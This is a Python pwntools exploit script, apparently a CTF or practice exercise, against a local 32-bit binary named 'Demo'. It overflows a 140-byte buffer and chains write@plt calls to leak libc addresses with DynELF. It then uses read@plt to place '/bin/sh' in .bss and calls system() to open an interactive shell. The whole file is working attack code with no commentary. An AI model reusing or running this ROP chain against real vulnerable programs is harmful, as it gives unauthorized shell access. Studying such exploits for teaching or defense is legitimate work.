#!/usr/bin/env python
import pwn

# libc = pwn.ELF('libc.so')
elf_Demo = pwn.ELF('Demo')

attack = pwn.process('./Demo')
# attack = remote('127.0.0.1', 23333)

plt_read = elf_Demo.plt['read']
print '###### plt_read = ' + hex(plt_read)

plt_write = elf_Demo.plt['write']
print '###### plt_write = ' + hex(plt_write)

got_write = elf_Demo.got['write']
print '###### got_write = ' + hex(got_write)

overflow_addr = 0x08048471
print '###### overflow_addr = ' + hex(overflow_addr)

addr_bss = 0x0804a020
print '###### addr_bss = ' + hex(addr_bss)

pppr = 0x080484F9

def leak(address):
    payload = 'a'*140
    payload += pwn.p32(plt_write)
    payload += pwn.p32(overflow_addr)
    payload += pwn.p32(1)
    payload += pwn.p32(address)
    payload += pwn.p32(4)
    attack.send(payload)
    data = attack.recv(4)
    # print hex(pwn.u32(data))
    # print "%#x => %s" % (address, (data or '').encode('hex'))
    return data 

d = pwn.DynELF(leak, elf=pwn.ELF('./Demo'))

addr_system = d.lookup("system", "libc")
print "###### addr_system = " + hex(addr_system)

payload = 140 * 'a'
payload += pwn.p32(plt_write)
payload += pwn.p32(overflow_addr)
payload += pwn.p32(1)
payload += pwn.p32(got_write)
payload += pwn.p32(4)

print "[1] Sending payload"
attack.send(payload)

print "[2] Receiving addr_write"
addr_write = pwn.u32(attack.recv(4))
print 'addr_write = ' + hex(addr_write)

payload_final = 140 * 'a'
payload_final += pwn.p32(plt_read)
payload_final += pwn.p32(pppr)
payload_final += pwn.p32(0)
payload_final += pwn.p32(addr_bss)
payload_final += pwn.p32(8)
payload_final += pwn.p32(addr_system)
payload_final += pwn.p32(overflow_addr)
payload_final += pwn.p32(addr_bss)

print "[4] Sending payload_final"
attack.send(payload_final)
attack.send("/bin/sh\0")
attack.interactive()
